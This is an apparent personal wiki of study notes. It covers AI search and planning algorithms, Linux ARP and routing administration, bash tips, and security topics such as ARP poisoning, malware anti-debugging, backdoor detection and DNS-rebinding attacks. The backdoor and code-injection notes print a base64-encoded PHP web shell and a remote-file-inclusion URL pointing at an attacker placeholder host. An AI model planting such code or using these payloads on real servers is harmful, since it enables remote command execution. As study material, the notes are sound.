!Iterative Refinement Search
Iterative Refinement Search tries iteratively to optimize the result, One of the examples is TSP, in which any permuatation is a result, the solution required is to optimise the cost of the tour.

Two approaches
# Hill Climbing(find maximum) / Gradient Descent(fidn minimum)
# Simulated Annealing - At high temperatures we take higher cost routes with more probability than at lower temparatures. Lower cost routes are always followed. 

* Hill Climbing
** Makesmoves which monotonically improve the quality of solution
** Can settle in a local minima
** Random-restart hill climbing

* Simulated Annealing
** Initilaize T (temperature)
** If T=0 return current state
** sel next = randomly selcted succ of current
** \E = Varl[next] - Val[current]
** For maxmimising problem, If \E &gt; 0, then set current = next
** Otherwise set current = next with prob e^^\E/T^^
** Update T as per schedule and Go To Step2

!Memory-bounded Search
Search algorithms which try to adapt to the memory limitations.
!!!Memory Bounded A : MA*
* Whenever [OPEN U CLOSED] approaches M, some of the least promising state are removed.
* To guarantee that the alogrithm terminates we need to back upt the cose of the most promising leaf of the subtree being deleted at the root of that subtree.

!Planning
Example: Get tea, biscuits and a book
* Given:
** Initial State: The agent is at ''home'' without tea, biscuits, book
** Goal state: The agent is at ''home'' with tea, biscuits, book
** States can be represented as predicates such as ''At(x), Have(y), Sells(x,y)''
** Actions:
*** Go(y) : Agent goes to y - casues At(y) to be true
*** Buy(z) : Agent buys z - causes Have(z) to be true
*** Steal(z) : Agent steals z

!!!Diff between Planning and Search
* Actions are given as logical descriptions of preconditions and effects.
** This enables the planner to make direct connections between states and actions.
* The planner is free to add actions to the plan whereve they are required, rather than in an incremental way starting from the initial state.
* Most parts of the world are independent of most other parts - hence divide and conquer works well.
* In the example above, the state space could start with how should i reach Have(Tea). I can reach Have(Tea) by Buy(Tea) or Steal(Tea) and so on.

!!!Situation Calculus
* Initial State
** At(Home, s0) &amp;&amp; !Have(Tra, S0) &amp;&amp; !Have(Biscuits,s0) &amp;&amp; !Have(Book,s0)
* Goal state
** (for some)s At(Home,s) &amp;&amp; Have(Tea,s) &amp;&amp; Have(Biscuits,s) &amp;&amp; Have(Book,s)
* Operators:
** (for all) a,s Have(Tea,Result(a,s)) &lt;=&gt; [(a=Buy(Tea) &amp;&amp; At(Tea-shop,s)) || (Have(Tea,s) &amp;&amp; a != Drop(Tea))]
** Result(a,s) names the situation resulting from executing the action a in the situation s.

!STRIPS
Called STanford Reserach Institute Problem Solver

!!!!Representing States
* States are represented by conjunctions of function-free groudn lieterals, no disjunctions are allowed.
** At(Home) &amp;&amp; !Have(Tea) &amp;&amp; !Have(Biscuits) &amp;&amp; !Have(Book)
* Representing goals, similar to the state example 
* Goals can also contain variables
** At(x) &amp;&amp; Sells(x,Tea)
** The above goal is being at a shop that sells tea
* Action description - serves as a name
* Precondition - a conjuction of positive literals
* Effect - a conjuction of literals(+ve or -ve)
** Original version had an addlist and a deleltelist
*** Example
{{{
Op( ACTION:    Go(there)
    PRECOND:   At(here) &amp;&amp;  Path(here,there)
    EFFECT:    At(there) &amp;&amp; !At(here))
}}}

!!!!Representing Plans
* A set of plan steps. Each step is one of the operators for the problem
* A set of step ordering constraints. Each ordering constraing is of the form S~~i~~ &lt; S~~j~~, indicating S~~i~~ must occur sometime before S~~j~~.
* A set of variable binding constraints of the form v = x, where v is a virable in some step, and x is either a constant or aanother variable
* A set of vausal links written as S-&gt;c:S^^'^^ indicating S satisfies the precondition c for S^^'^^
* Example
{{{
Actions 
     Op(ACTION: RightShoe,
            PRECOND: RighSockON,
	    EFFECT: RightShoeOn)
     Op(ACTION: RightSock,
            EFFECT: RightSockOn)
     Op(ACTION: LeftShoe,
            PRECOND: LeftSockOn,
	    EFFECT: LeftShoeOn)
     Op(ACTION: LeftSock,
            EFFECT: LeftSockOn)

Initial Plan
  Plan(
     STEPS: {
         S1: Op(ACTION:start)
	 S2: Op(ACTION:finish,
	        PRECOND: RightShoeOn &amp;&amp; LeftShoeOn)
     },
     ORDERINGS: {S1 &lt; S2},
     BINDING: {},
     LINKS: {}
  )

We check the preconditions required the goal, and see that we need RightShoeOn and LeftShoeOn, we define these two as 2 steps, S3 and S4 ( add them into STEPS), We added the links between S3-&gt;c: S2 and S4:-&gt;c: S2, which are added to ORDERRINGS and LINKS. And as we go on, we keep adding entries into each of the Plan elements.   
}}}
* Any unmentioned literals are considered false
* Partial Order Planning Alogrithm
{{{
--&lt; represents do LHS before RHS

function POP(initial, goal, operators)
// Returns plan
   plan &lt;-- Make-Minimal-Plan(initial,goal)
   Loop do
      If Solution(plan) then return plan
      S,c &lt;-- Select-Subgoal(plan)
      Choose-Ooperator(plan,operators,S,c)
      Resolve-Threats(plan)
   end

Proc Choose-Operator(plan,operators,S,c)
   choose a step S^^'^^ from operators or
      STEPS(plan) that has c as an effect

   if there i sno such step then fail
   add the causal link S^^'^^ --&gt;c:S to LINKS(plan)
   add the ordering constraing S^^'^^ --&lt; S to ORDERINGS(plan)

   if S^^'^^ is anewly added step from operators
      then add S^^'^^ to STEPS(plan) and add
      Start --&lt; S^^'^ --&lt; Finish to ORDERINGS(plan)

Procedure Resolve-Threats(plan)
   for each S^^''^^ that threatens a link
   S~~i~~ -&gt;c:S~~j~~ in LINKS(plan) do
      choose either
           Promotion: Add S^^''^^ --&lt; S~~j~~ to ORDERINGS(plan)
           Demotion: Add S~~j~~ --&lt; S^^''^^ to ORDERINGS(plan)

   if not Consistent(plan) then fail
}}}

</pre>
</div>
<div title="ARP" modifier="YourName" modified="200807021150" created="200807020727" changecount="5">
<pre>!ARP conversation captured with tcpdump
{{{
[root@masq-gw]# tcpdump -ennqti eth0 \( arp or icmp \)
tcpdump: listening on eth0
0:80:c8:f8:4a:51 ff:ff:ff:ff:ff:ff 42: arp who-has 192.168.99.254 tell 192.168.99.35         
0:80:c8:f8:5c:73 0:80:c8:f8:4a:51 60: arp reply 192.168.99.254 is-at 0:80:c8:f8:5c:73        
0:80:c8:f8:4a:51 0:80:c8:f8:5c:73 98: 192.168.99.35 &gt; 192.168.99.254: icmp: echo request (DF)
0:80:c8:f8:5c:73 0:80:c8:f8:4a:51 98: 192.168.99.254 &gt; 192.168.99.35: icmp: echo reply      
}}}

!Gratuitous ARP reply frames
where a machine announces its ownership of an IP address on a media segment. The arping utility can generate these gratuitous ARP frames. Linux kernels will respect gratuitous ARP frames
{{{
[root@tristan]# arping -q -c 3 -A -I eth0 192.168.99.35
[root@masq-gw]# tcpdump -c 3 -nni eth2 arp
tcpdump: listening on eth2
06:02:50.626330 arp reply 192.168.99.35 is-at 0:80:c8:f8:4a:51 (0:80:c8:f8:4a:51) 
06:02:51.622727 arp reply 192.168.99.35 is-at 0:80:c8:f8:4a:51 (0:80:c8:f8:4a:51) 
06:02:52.620954 arp reply 192.168.99.35 is-at 0:80:c8:f8:4a:51 (0:80:c8:f8:4a:51)
}}}

!Unsolicited ARP request frames
Unsolicited ARP request frames, on the other hand, are broadcast ARP requests initiated by a host owning an IP address. 
{{{
[root@tristan]# arping -q -c 3 -U -I eth0 192.168.99.35
[root@masq-gw]# tcpdump -c 3 -nni eth2 arp
tcpdump: listening on eth2
06:28:23.172068 arp who-has 192.168.99.35 (ff:ff:ff:ff:ff:ff) tell 192.168.99.35
06:28:24.167290 arp who-has 192.168.99.35 (ff:ff:ff:ff:ff:ff) tell 192.168.99.35
06:28:25.167250 arp who-has 192.168.99.35 (ff:ff:ff:ff:ff:ff) tell 192.168.99.35
[root@masq-gw]# ip neigh show
}}}

!ARP Cache
An ARP cache is a stored mapping of IP addresses with link layer addresses. The ARP cache is also known as the neighbor table. As with many of the iproute2 tools, more information is available via ip neighbor than with arp.

{{{
[root@tristan]# arp -na
? (192.168.99.7) at 00:80:C8:E8:1E:FC [ether] on eth0
? (192.168.99.254) at 00:80:C8:F8:5C:73 [ether] on eth0
[root@tristan]# ip neighbor show
192.168.99.7 dev eth0 lladdr 00:80:c8:e8:1e:fc nud reachable
192.168.99.254 dev eth0 lladdr 00:80:c8:f8:5c:73 nud reachable
}}}

The only way to list permanently advertised entries in the neighbor table (proxy ARP entries) is with the arp. 

Entries in the ARP cache are periodically and automatically verified unless continually used. Along with net/ipv4/neigh/$DEV/gc_stale_time, there are a number of other parameters in net/ipv4/neigh/$DEV which control the expiration of entries in the ARP cache. At gc_stale_time the state of the entry will change, reflecting the need to verify the reachability of the link layer address. 


|!ARP cache entry state|!meaning|!action if used|
|permanent|	never expires; never verified	|reset use counter|
|noarp|	normal expiration; never verified	|reset use counter|
|reachable|	normal expiration	|reset use counter|
|stale|	still usable; needs verification	|reset use counter; change state to delay|
|delay|	schedule ARP request; needs verification|reset use counter|
|probe|	sending ARP request|	reset use counter|
|incomplete|	first ARP request sent|	send ARP request|
|failed|	no response received|	send ARP request|

!The ARP Flux Problem
 When a linux box is connected to a network segment with multiple network cards, a potential problem with the link layer address to IP address mapping can occur. The machine may respond to ARP requests from both Ethernet interfaces. On the machine creating the ARP request, these multiple answers can cause confusion, or worse yet, non-deterministic population of the ARP cache. Known as ARP flux [13], this can lead to the possibly puzzling effect that an IP migrates non-deterministically through multiple link layer addresses. It's important to understand that ARP flux typically only affects hosts which have multiple physical connections to the same medium or broadcast domain.

{{{
[root@real-client]# arping -I eth0 -c 3 10.10.20.67
ARPING 10.10.20.67 from 10.10.20.33 eth0
Unicast reply from 10.10.20.67 [00:80:C8:7E:71:D4]  11.298ms
Unicast reply from 10.10.20.67 [00:80:C8:E8:1E:FC]  12.077ms
Unicast reply from 10.10.20.67 [00:80:C8:E8:1E:FC]  1.542ms
Unicast reply from 10.10.20.67 [00:80:C8:E8:1E:FC]  1.547ms
Sent 3 probes (1 broadcast(s))
Received 4 response(s)
}}}

To fix the problem, if all the interfaces on a different subnet
{{{
sysctl -w net.ipv4.conf.all.arp_filter=1
}}}

A more effective solution is
{{{
# when an arp request is received on any interface, only respond if 
# that address is configured on that interface.
echo 1 &gt; /proc/sys/net/ipv4/conf/all/arp_ignore

# when making an arp request sent through any device, always use an 
# address that is configured on that device as the source address of
# the arp request
echo 2 &gt; /proc/sys/net/ipv4/conf/all/arp_announce
}}}

!Proxy ARP
Proxy ARP is a technique for splitting an IP network into two separate segments. Hosts on one segment can only reach hosts in the other segment through the router performing proxy ARP.

{{{
case &quot;$1&quot; in
start)
	# -- create proxy arp settings according to
	#    table in the config file
	#
	grep -Ev '^#|^$' $CONFIG | {
	    while read INTERFACE IPADDR ; do
		[ -z &quot;$INTERFACE&quot; -o -z &quot;$IPADDR&quot; ] &amp;&amp; continue
		    arp -s $IPADDR -i $INTERFACE -D $INTERFACE pub
		    done
	}
	;;
	stop)
	# -- clear the cache for any entries in the
	#    configuration file
	#
	grep -Ev '^#|^$' /etc/proxy-arp.conf | {
	    while read INTERFACE IPADDR ; do
		[ -z &quot;$INTERFACE&quot; -o -z &quot;$IPADDR&quot; ] &amp;&amp; continue
		    arp -d $IPADDR -i $INTERFACE
		    done
	}
	;;
	status)
	arp -an | grep -i perm
	;;
	restart)
	$0 stop
	$0 start
	;;
	*)
	echo &quot;Usage: proxy-arp {start|stop|restart}&quot;
	exit 1
esac

exit 0
#   
# - end of proxy-arp
}}}

[[ARP Hacking]]

</pre>
</div>
<div title="ARP Hacking" modifier="BhargavaKancherla" modified="200807151018" created="200801151338" changecount="6">
<pre>!ARP packet format
[img[images/arp_packet_format.jpg]]

!ARP Request
[img[images/arp_request.jpg]]

!ARP Reply
[img[images/arp_reply.jpg]]

!ARP Attacks

ARP is unauthenticated
Whoever sends a reply to a requester first wins
#The ARP cache is updated with the contents of the reply
#Sometimes the ARP cache is updated when it gets a reply even if it didn't send a request (depends on OS)
This is exploited by sending forged REPLY packets to a victim to have them update their ARP cache

''Man in the middle'' : Poison the victim with you MAC address for the IP address of the gateway, Host communicates with you instead of the gateway
''Denial of Service'' : Poison the victim with a bogus MAC address and the IP address of the gateway, hosts can't communicate with the gateway
''Hub'' : A network hub broadcasts all packets to all ports
''Switch'' : A switch on the other hand maintains a record of whatever addresses are associated with each switch port in its CAM (~Content-Addressable Memory)

!CAM table overflow
#Attacker sends thousands of bogus MAC addresses to the networ
#Switch's CAM table is updated with each MAC
#The CAM table can only hold so much data, so at some point it becomes full
#The switch then forwards all traffic to al ports again (like a hub)
since switch now acts as a hub, the attacker can now eavesdrop ('sniff') all traffic on that segment

CAM table overflow requires many hundreds if not thousand of spoofed ~ARPs, very noisy and idenfitable attack. Cisco's port security limits the number of MAC addresses on each switch port. Once the limit is reached switch does not recognise any more MAC addresses on that port.

!ARP Poisoning using ARP Request packets

Prior to responding to ARP Request packets, the host will update or 'add' the source protocol address (SPA) and source hardware address (SHA) to its cache. ( specified by RFC 826 )

Attacker sends ARP Request to host with the gateways ip address but with attackers MAC address and source addresses.

Using the ARP cache poisoning technique detailed above, if we poison the ARP cache of the victim with a NULL hardware address (00:00:00:00:00:00) for the destination (i.e network gateway). All frames from the victim to the gateway will be forwarded to all switch ports, allowing us to eavesdrop on that communication

Some ~OSs can be poisoned with their own MAC address for the destination

If a host receives an ARP request or reply with the same protocol address ( IP address ) as its own interface, but with a different hardware (MAC) address. Most Oss will warn the user that a duplicate IP address is in use on the network. Sending many packets like this to the victim could slow down ~OSs like windows. 



</pre>
</div>
<div title="AppMap" modifier="BhargavaKancherla" created="200807151010" changecount="2">
<pre>Add ''network components to application dependency map''.

''Appmap'' discovers layer 2 and layer 3 switches between any two endpoints, detects firewalls, handles NAT and proxy servers. It uses this information to monitor devices to detect network failure. 

Appmap provides API to get this network information for applications.
</pre>
</div>
<div title="Armoring Techniques" modifier="BhargavaKancherla" modified="200807071132" created="200801140819" changecount="6">
<pre>!Packing and Encryption

Pakcing is the method that an executable uses to obfuscate an executable or to reduce its size. Packets are typically implemented with a asmall decoder stub which is used to unpack, or deobfuscate the binary in question. Once the decoding of 'unpacking' process is complete, the decoder sutb then transfers control back to the original code of the program. Execution proceeds similarly to that of a normal executable. 

!Virtual Machine Detection

The typical targets for malware authors are stand-alone systems that are being used for everyday tasks such as email, and online banking. If a virtual machine is detected, it is most likely being used to analyze the program. Due to inherent flaws in the X86 architecture, virtualization cannot be supported at the hardware level. Certain instructions cannot be supported at the hardware level. Fox x86 architecture these are composed of SLDT, SIDT and SGDT instructions. The malware author can simply perform these instructions, and compare the results afterwards. Results will be different for virtual machines executing these instructions when compared to real hardware executing them. 

!Debugger Detection

''Windows Debugging API''
The windows operating system implements a robust API for developing custom debuggers for applications. It is implemented using a call-back method which allows the operating system to single-step a running program at the machine instruction level. Detection of this type of debugger is as simple as looking at the process execution block PEB for a running program. One field that is available inside the data-structure is ~BeingDebugged field. If thit bit is set, it indicates that a debugger is attached to the process. Fortunately for the anlayst, this bit can be toggled without losing the debugging capability.

''~INT3 Instruction Scanning''
This instruction causes a CPU trap to occur in the operating system. The trap is then propogated to the running program via the operating system. This provides a method by which a developer can set a breakpoint. However, programmers almost never put int3 instructions directly into their programs so it is likely if this is observed, a process is being monitored. Malware authors have implemented various methods to scan for the prescence of this ~INT3 instruction, and alter execution if it is found. A simple CRC check or ~MD5SUM can detect and validate that the code has not been altered by an ~INT3

''Unhandled Structured Exception Handlers''
Structed Exception Handlers (SEH) are a method of catching exceptions from running applications. Normally when a SEH is reached execution is passed to the handler the program developer has defined, or treated as an unhandled exception and execution halts. Malware authors have seized this as a method for implementing an unpacker. The malware author inserts a SEH and their own handler. This hanlder is typically a set of unpacking instructions. The SEH frame contains a pointer to the previous frame. By triggering SEH executions the stack of a malware program is unwound until an appropriate handler is found. Due to the nature of the debugging interface, the debugger will insert its own SEH handling onto this stack. When the debugged program is run, it will raise an exception. This causes the debugger's stack to catch and handle the SEH instead, possibly crashing the debugger and preventing the malware from unpacking itself. Since there is no way for the debugger to discern between an exception generated by an error in its program, and the debugged program, this typically thwarts unpacking.

''~Mid-Instruction Jumping''
Tpyically a debugger will try to interpret the machine code of a running executable and print out more human readable output. A typical trick that can be performed is to take a long instruction and the value of 0x90  as a parameter. This last parameter, interpreted on its own is the nop, or no-operation instruction. This will cause the CPU to run to the next instruction and continue execution.

''Shifting Decode Frame''
Shifting decode frame is a method by which a protion of the executable is unpacked, executed then re-encoded. This method has the effect of preventing static post-execution analysis. This precludes the ability to step the executable to the position of the original entry point, and dump the entire executable. 

!Dynamic Instrumentation

Dynamic Instrumentation (DI) can be used to trace the exact execution of a debugged binary. Debug tools such as //Vargrind// and //PIN// can provide insight into the exeuction characterstics of a program.

Pin interfaces with the machine code via a series of callbacks that are registered on analysis startup. One can divert execution of a program at each instruction to addresses.

By tracking memory read and writes, we can watch where the program modifies memory locations during the course of execution. Furthermore we can use this information to watch for executions inside of this written memory area. 
</pre>
</div>
<div title="Asymmetric Routing" modifier="BhargavaKancherla" modified="200807071138" created="200801150733" changecount="4">
<pre>!Asmmetric Routing
Asymmetric TCP/IP routing causes a common performance problem on servers that have more than one network connection. The atypical network on the example server, interface ''eth0'' is bound to address ''192.168.16.20'' and interface ''eth1'' is bound to ''192.168.16.21''. Each routing policy has an associated priority. Policies with a lower priority number take precedence over policies that also may match the candidate packet but have a higher priority value. The priority is an unsigned 32-bit number, so there is never a problem finding enough priority levels to express any algorithm in great detail. 

At start-up time, the kernel creates several default rules to control the normal routing for the server. These rules have ''priorities'' 0, 32766 and 32767. The rule at priority 0 is a special rule for controlling intra-box traffic and does not affect us. However, we do want our new rules to take precedence over the other default rules, so they should use priority numbers less than 32766. These two default rules also may be deleted if you are sure your replacement routes never need to fall back on the default behavior of the server.

The new policy rules are added using the ip rule add command. The from attribute is used to generate source address-based routing policies.

{{{
#ip rule add from 192.168.16.20/32 tab 1 priority 500
#ip rule add from 192.168.16.21/32 tab 2 priority 600
}}}

Under this setup, outgoing packets first are checked for source address 192.168.16.20. If that matches they use routing table 1, which sends all traffic out eth0. Otherwise the packets are checked for source addresses that match 192.168.16.21. Matches to that rule would use table 2, which sends all traffic out eth1. Any other packets would use the default system rules detailed by rules 32766 and 32767.

{{{
#ip rule show
0:      from all lookup local 
500:  from 192.168.16.20 lookup 1
600:  from 192.168.16.21 lookup 2 
32766:  from all lookup main 
32767:  from all lookup 253 
}}}

Changes made to the policy database do not take effect dynamically. To tell the kernel that it needs to re-parse the policy database, issue the ip route flush cache command:

{{{
#ip route flush cache
}}}
</pre>
</div>
<div title="Backdoors" modifier="BhargavaKancherla" modified="200807071129" created="200801140820" changecount="5">
<pre>!Types of Backdoors
//''System Backdoors''// are backdoors that allow access to data and processes at the system level. Rootkits, remote access software, and delibrate system misconfiguration by an attacker fall in this category.

//''Application Backdoors''// are versions of legitimate software modified to bypass security mechanisms under certain conditions. These legitimate programs are meant to be installed and running on a system with the full knowledge and approval of the system administrator. Applications backdoors are often inserted in the code by someone who has legitimate access to the code. Other times the source code or binary to an application is modified by someone who has compromised the system where the source code is maintained or the binary is distributed.

//''Crypto Backdoors''// are a third category of backdoors. These are intentionally designed weaknesses in a cryptosystem for particular keys or messages that allow an attacker to gain access to clear-test messages that they shouldn't.

!Application Backdoor Classes

''Special Credentials''
The attacker inserts logic and special credentials into the program code. The special credentials are in the form of a special username, password, password hash, or key. The logic is a comparison to the special credential logic that inserts the special credential into the designed credential store. 

//''Detection Strategies''// include identifying static variables that look like usernames and passwords. Start with all strings using ASCII character set. Also inspect known crypto API calls where these strings are passed in as plaintext data.

!!!Hidden Functionality
Hidden Functionality backdoors allow the attacker to issue commands or authenticate without performing the desinged authentication procedure. Hidden funcitonality backdoors often use special parameters to trigger special logic within the program that shouldn't be there. 

//''Detection Strategies''// include recongnising common patterns in the scripting languages: create an obfuscated string, input into deobfuscation function, call eval() on the result of the deobfucsation. Payload code often allows command execution or auth bypass. Identify GET or POST parameters passed by web applications then compare them to form fields in HTML and JSP pages to find fields that only appear on the server side. 

''Uninntended Network Activity''
This may involve a number of techniques including listening on undocuemented ports, making outbound connections to establish a command and control channel, or leaking sensitive information over the network via STMP, HTTP, UDP, ICMP or other protocols. 

//Detection Strategies// include identifying all locations in the codebase that call functions responsible for establishing connections or sending/receiving connectionless data, such as connect(), bind(), accept(), sendto(), listen() and recvfrom(). Once these calls have been identified pay particular attention to any outbound network activiity that reference a hard-coded IP address or port. Keep in mind that many applications have functionality built in to automaticallly chekc for updates, so seeing at least one hard-coded outbound connection is not uncommon. 

''Manipulation of ~Security-Critical Parameters''
In any program, certain variables or parameters are more significant than others from a security standpoint. In application code, consider variables used to store the results of authentication or authorisation functions, or other security mechanisms. By directly manipulationg these parameters or introducing flawed logic to comparisons against them. 

{{{
if ((options == (__WCLONE|__WALL)) &amp;&amp;
	(current-&gt;uid = 0))
	retval = -EINVAL;
}}}

The second half of the conditional assigns current-&gt;uid to zero rather than comparing it with zero. As a result, a calling process is granted root privilieges if it calls wait4() with the _WCLONE and _WALL options set.

!Self-modifying Code

Any code that modifies itself at run-time is immediately suspicious. This behaviour is used commonly in scripting languages but can just as easily appear in native code. Conider the following example in PHP
{{{
eval(base64_decode(&quot;cGFzc3RocnUoJF9HRVRbJ2NtZCddKTs=&quot;));
}}}
When the PHP script executes, this line of code evaluates the result of the base64_decode() operations as a PHP command. Therefore, if the decoded string contains valid PHP, it will be executed in the context of the running process.
{{{
eval(&quot;passthru($_GET('cmd'));})
}}}
The effect of the resulting code is to parse the &quot;cmd&quot; parameter from the HTTP request, and call the passthru() function, which executes the supplied command on the server.

</pre>
</div>
<div title="Bash Tips" modifier="BhargavaKancherla" modified="200801151434" created="200801141018" changecount="1">
<pre>''Convert text file to ps file with font 15''
{{{
 a2ps -1 -f 15 proxy_api.txt -o test.ps 
}}}

''Sort files by date''
{{{
find -type f -printf &quot;%AY%Am%Ad %p \n&quot; | sort -nr 
}}}

''Generate Html for ls''
{{{
(echo &quot;&lt;table frame=box&gt;&quot;;  for i in `ls *.pdf `; do echo &quot;&lt;tr&gt;&lt;td&gt;&lt;a href=$i&gt;$i&lt;/td&gt;&lt;/tr&gt;&quot;; done ; echo &quot;&lt;/table&gt;&quot;)
}}}

''Remove comments and blank lines.''
{{{
grep -vE '^$|^#' /etc/httpd/conf/httpd.conf
}}}

''list of program listening to this port(22)''
{{{
lsof -i :22 
}}}

''Download url and covert links''
{{{
wget -p -nd -k -r -l 1 &lt;url&gt;
}}}

''Print the man Page.''
{{{
man ls | col -b
}}}

''Copy Links Source to Destination''
{{{
cp -Lr &lt;Source&gt; &lt;Destination&gt;
}}}

*clude&quot; {} \; | cut -d&quot;:&quot; -f 3 |sort | uniq | cut -d&quot;&lt;&quot; -f 2 | cut -d&quot;&gt;&quot; -f 1  | grep -v linux | rev| cut -d&quot;/&quot; -f 1 | rev ###Find Include files
**''&lt;nowiki&gt;find -name &quot;*.[ch]&quot; -exec grep -nH &quot;&lt;/nowiki&gt;''

''Grep for undefined symbols in /tmp/dlm_undef''
{{{
for i in `find -name *.ko `;   do echo $i; nm $i|grep -f ~/tmp/dlm_undef ; done 
}}}

*Check broken Links
**''&lt;nowiki&gt;find -follow 2&gt; ~/tmp/ooooo &gt; /dev/null; wc -l ~/tmp/ooooo &lt;/nowiki&gt;''
*List broken files
**''&lt;nowiki&gt;cat ~/tmp/ooooo |cut -d&quot; &quot; -f 2 | cut -d&quot;:&quot; -f 1 | xargs ls -l |cut -d&quot;&gt;&quot; -f 2 | sort | uniq | more &lt;/nowiki&gt;''
*Change Command Prompt
**''&lt;nowiki&gt;PS1=&quot;[\u@\h \W]\$&quot; &lt;/nowiki&gt;''
*Make.pl all at time
**''&lt;nowiki&gt;make.pl  &quot;&quot; &quot;and&quot; | tac | sed -e 's/make/gmake/' &lt;/nowiki&gt;''
*To get the value of the variable
**''&lt;nowiki&gt;gconftool-2 --get /desktop/gnome/background/picture_filename &lt;/nowiki&gt;''
*Keyboard Shortcut
**''&lt;nowiki&gt;&quot;ESC .&quot; Inserts the last word of the previous command &lt;/nowiki&gt;''
</pre>
</div>
<div title="Before Ajaxulation" modifier="BhargavaKancherla" modified="200807071127" created="200801140822" changecount="3">
<pre>In order to make partial page updates more useful, it can be worthwhile to increase the granuality of your server-side functions. It would be pointless to expose a single ''~Do-It'' operation that provides no user feedback while it is processing. Providing more finely grained server-side api helps third party websites to create effective mashups from your application. On the other hand, attackers can easily subver the intended application workflow and call functions out of order, change the parameter values of the calls, or omit the calls entirely

A real world example of this design flaw is a function which updates the password for a user

{{{
public string updatePassword(string custID, string newPassword)
}}}

There are not authentication ro authorization checks enforced on this code. anyone can call this function and change any user's password to any desired value. This code was probably originally a private method called during a page postback, and auth was enforced earlier in the call stack. However once the application was converted to ajax and the method visibility change to publc, the code became vulnerable.

Asynchrous operation implies mutli-threaded operations. The use of multiple threads of execution opens the door to classic threading problems such as race conditions and deadlocks.

</pre>
</div>
<div title="Building SanFS" modifier="BhargavaKancherla" modified="200807071151" created="200806260856" changecount="8">
<pre>!Linux sanfs build &amp; testing howto

!!Building:

* Use sanfs-cvs/b_linux1, vxfs-cvs/b_sanfs for the build.
* top-level build does not work. the dependencies are shown below &amp; you need to build according to that:
** sanfs server requires vzlib, vzdlmm
** vzdlmm requires vzlib
** sanfs client requires vzlib, vzdlmp, reusefs
** vzdlmp requires vzlib, reusefs (not sure about reusefs though)
** vzlib requires nothing.
** reusefs requires nothing.
** vzshowexports requires libvzsanfs
** mount requires nothing.
** libvzsanfs requires nothing

!!Testing:

Typically, here's what I need to do when the machine has just come up through a reboot:

!!!On the server:

# set -x
# modprobe vxted
# insmod vxfs.ko (built from vxfs-cvs/b_sanfs)
# insmod vxportal.ko (ditto)
# insmod ~SANFSsrv.ko (built from sanfs-cvs/b_linux1)
# vxmount64 -F vxfs -o server &lt;device&gt; &lt;mountpoint&gt;
    (note that the command exits with an error code but the mount systemcall has succeeded, have't figured out what's the problem yet; vxmount64 is the 64-bit version of the vxfs mount command - yes you need to use that, I STILL haven't gotten around to figure out what's the problem here).


!!!On the Client:

# set -x
# modprobe vxted
# insmod vzsanfs.ko (built from sanfs-cvs/b_linux1 &amp; NOT from the tot).
# mount -F vzsanfs &lt;server&gt;:&lt;device&gt; &lt;mountpoint&gt;
# whatever tests you want to run.

Note:
* Use 64 bit versions of the utilities mkfs, mount etc. The 32-bit binaries are not working. Need to investigate.</pre>
</div>
<div title="Code Injection" modifier="BhargavaKancherla" modified="200801151433" created="200801140822" changecount="1">
<pre>!PHP code injection

The attack, in the form of an HTTP request

''index.php?page=http://badguy.tld/marlwar.cmd?cmd=ls''

Resulting PHP code
	
''&lt;? include ($_GET[page]); ?&gt;''

causes the web server to act like a client and download the software in question

</pre>
</div>
<div title="Configure PXE install on SFS" modifier="YourName" created="200807010723" changecount="1">
<pre>{{{
#!/bin/bash
set -x
mkdir /tmp/imagecontents
mv /instserver /instserver_secondary
mkdir /instserver
mount -o loop /tmp/image.iso /tmp/imagecontents
cp -a /tmp/imagecontents/* /instserver
tar -C /tmp -cf /instserver/imagecontents.tar imagecontents
umount /tmp/imagecontents
set +x
}}}</pre>
</div>
<div title="DNS Attacks" modifier="BhargavaKancherla" modified="200807071125" created="200801140826" changecount="6">
<pre>!DNS Spoofing

''DNS Spoofing'' attacks against web browsers are primarly intended to trick a browser into violating the ''same origin policy''. Since same-origin applies to hosts, but not IP addresses, an attacker could use a DNS server he controls to erase the distinction between two different servers. This is the basic attack sequence

#Get the victim browser a site (probably using XSS) on a attacker-controlled domain.
#The victim browser queries the DNS server for the attack domain and receives the attacker-controlled IP address.
#The victim browser requests content from the attack server and becomes infected with the attack code. 
#The attack pauses long enough for the DNS record's TTL to expire. 
#The attack code initiates a new request to the DNS server, and requeries DNS server.
#The attack DNS server responds with the IP address of the victim server.
#The attack code connects to the victim server, and does something useful 
#The results are returned to the user

!DNS Pinning

To prevent DNS Spoofing attacks, browser makers introduced DNS pinning. This forces the browser into using a single IP address for any given host. Once the DNS response has been received, the browser will pin it in the cache as long as the browser is running. 

!Fundamentals of ~Anti-DNS Pinning Attacks

Most techinques for defeating DNS pinning exploit the necessity to eventually expire the DNS record. One method has this sequence

#The victim browser load the attack code
#The victim broswer closes, either by user action or by attack
#When the browser is opened, the attack code is loaded from the disk cache
#The attack code initiates a request to the attack web server ( should be victim web server ? )
#The attack ~DNS-server responds with the IP address of the victim server

This technique is difficult to defeat by browser design because the browser must dump its DNS cache eventually, and becasue a disk based content cache is considered critical for modern browsers. 

Considering that major web browsers do not fully implement DNS pinning, there is a much simpler attack. To support ~DNS-based fault tolerance, browsers will dump their DNS cache if the web browser becomes unavailable. The attack sequence becomes much simpler to execute

#The victim browser loads the attack code
#The attacker firewalls the attack web server
#The attack code initiates a request to the attack web server
#The request times out and the browser dumps its DNS cache
#The browser requeries and receives the IP address of the victim server

!Practical ~Anti-DNS Attacks Using Javascript

''Victim Browser :'' Tricked into visiitng a malicious site, probably via XSS, the victim browser loads code that periodically polls the attack server for new commands. Ex. Javascript appends a new script tag onto the document body. The source of the tag is a request to the controller script, which returns either a blank document, or new ~JavaScript commands.

''Browser based ~JavaScript Proxy :'' The primary purpose of this code is to relay requests and responses between the attack server and the victim web server. In the demonstatrion, it is loaded in an iFrame from the attack server by the victim browser's polling process.

''Controller script :'' A CGI script with many functions identified by a 'command' parameter. The script is hosted on two IP addresses; one is used for performing the anti-DNS pinning attack with the randomly generated hostname, the other is used for communicating commands between other components. Key functions include

#An attack console listing all active victim browsers, and commands that can be sent
#Periodically polled by the victim browser for new commands
#Changes DNS records and firewall rules as needed to facilitate the actual anti-DNS pinning attack
#Periodically polled by the Javascript proxy for new requests to process
#Receives the HTTP responses from the ~JavaScript proxy

!Data Exchange

''~JavaScript Proxy and victim web server''
The ~XMLHTTPRequest ( XHR) object is used to initiate requests to the web server. Normally XHR can only handle text data and will effectively strip off the high ASCII bit. By setting the character to 'x-user-defined', the browser will retain all 8-bits of data, allowing for full binary data support.

''Javascript Proxy to Controller Script''
